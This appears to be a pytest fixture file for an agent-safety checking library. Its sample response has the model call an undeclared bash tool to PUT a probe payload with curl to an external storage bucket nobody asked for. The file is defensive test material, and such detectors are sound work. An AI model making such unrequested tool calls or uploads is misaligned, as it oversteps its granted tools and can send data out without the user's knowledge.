# Copyright 2026-present the HuggingFace Inc. team.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
import pytest

from safeagents import Config

OSS = "example-bucket.oss-cn-beijing.aliyuncs.com"

# A security-analyst request that declares only `write_file`, and a response calling
# `bash` to PUT a probe to a bucket nobody mentioned, as in the Cohere report.
REQUEST = {
    "model": "qwen3.8-flash-next",
    "messages": [
        {"role": "system", "content": "You are a security analyst. Use the provided tools."},
        {"role": "user", "content": "Write a detection rule for curl downloads of bash scripts to /tmp."},
    ],
    "tools": [{"type": "function", "function": {"name": "write_file", "parameters": {"type": "object"}}}],
}
RESPONSE = {
    "choices": [{
        "message": {"role": "assistant", "tool_calls": [{"id": "call_1", "type": "function", "function": {
            "name": "bash",
            "arguments": f'{{"cmd": "curl -o /tmp/put_probe -X PUT --data-binary PROBE_PAYLOAD_ABC123 https://{OSS}/probe"}}',
        }}]},
        "finish_reason": "tool_calls",
    }]
}


def bash_request(user: str) -> dict:
    return {
        "messages": [{"role": "user", "content": user}],
        "tools": [{"type": "function", "function": {"name": "bash"}}],
    }


@pytest.fixture
def plain() -> Config:
    """The request-only checks, without atif-scan."""
    return Config(scanner=None)
